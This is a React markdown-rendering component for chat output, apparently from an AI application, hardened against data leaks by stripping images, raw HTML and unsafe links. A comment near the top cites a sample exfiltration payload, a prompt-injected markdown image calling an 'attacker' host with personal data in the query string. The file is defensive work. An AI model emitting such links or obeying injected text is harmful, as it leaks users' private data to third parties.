"use client";

import { harden } from "rehype-harden";
import { defaultRehypePlugins, Streamdown, type Components } from "streamdown";

import { useMessages } from "@/lib/i18n";

// Hardened per research R4: Streamdown's defaults allow raw HTML, `data:` images and any
// image prefix, so a prompt-injected `![](https://attacker/?q=<pii>)` would leak data on
// render. No `raw` plugin (raw HTML is never parsed), no images, and links limited to
// http(s)/mailto. rehype-harden matches prefixes by origin, so "any https link" is `*`;
// it always blocks javascript:, data:, file: and vbscript:, and `SAFE_HREF` re-checks.
const rehypePlugins = [
  defaultRehypePlugins.sanitize,
  [
    harden,
    {
      allowedLinkPrefixes: ["*"],
      allowedImagePrefixes: [],
      allowDataImages: false,
      linkBlockPolicy: "text-only",
      imageBlockPolicy: "remove",
    },
  ],
] satisfies NonNullable<React.ComponentProps<typeof Streamdown>["rehypePlugins"]>;

const SAFE_HREF = /^(https?:|mailto:)/i;

const components: Components = {
  img: () => null,
  a: ({ href, children }) =>
    href && SAFE_HREF.test(href) ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        className="font-medium break-all text-primary underline underline-offset-3"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};

type MarkdownProps = { children: string; streaming?: boolean };

export function Markdown({ children, streaming = false }: MarkdownProps) {
  const messages = useMessages();
  return (
    <Streamdown
      className="min-w-0 break-words [&_pre]:overflow-x-auto [&_table]:block [&_table]:overflow-x-auto"
      mode={streaming ? "streaming" : "static"}
      parseIncompleteMarkdown={streaming}
      isAnimating={streaming}
      rehypePlugins={rehypePlugins}
      components={components}
      controls={false}
      linkSafety={{ enabled: false }}
      translations={messages.markdown}
    >
      {children}
    </Streamdown>
  );
}
